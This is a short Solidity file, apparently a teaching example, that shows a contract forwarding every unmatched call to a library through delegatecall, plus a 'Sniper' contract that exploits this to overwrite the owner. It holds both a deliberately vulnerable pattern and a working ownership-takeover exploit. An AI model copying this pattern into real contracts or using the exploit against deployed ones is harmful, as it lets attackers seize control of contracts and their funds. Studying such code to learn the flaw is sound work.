// SPDX-License-Identifier : MIT

 pragma solidity ^0.8.17;

  contract Vulnerable{
    address public owner;
    V2 public v2;

    constructor(V2 _v2){
      v2 = V2(_v2);
      owner = msg.sender;
    }

    fallback()external payable{
        address(v2).delegatecall(msg.data);
    }
  }


  contract V2{
      address public owner;

      function callMe() public {
          owner = msg.sender;
      }
  }

  contract Sniper{
     address public vulnerable;

     constructor(address _vulnerable) public {
         vulnerable = _vulnerable;
     }

     function strike() public{
       (bool executed, bytes memory data) =  vulnerable.call(abi.encodeWithSignature("callMe()"));
       require(executed, "not successful");
     }
  }
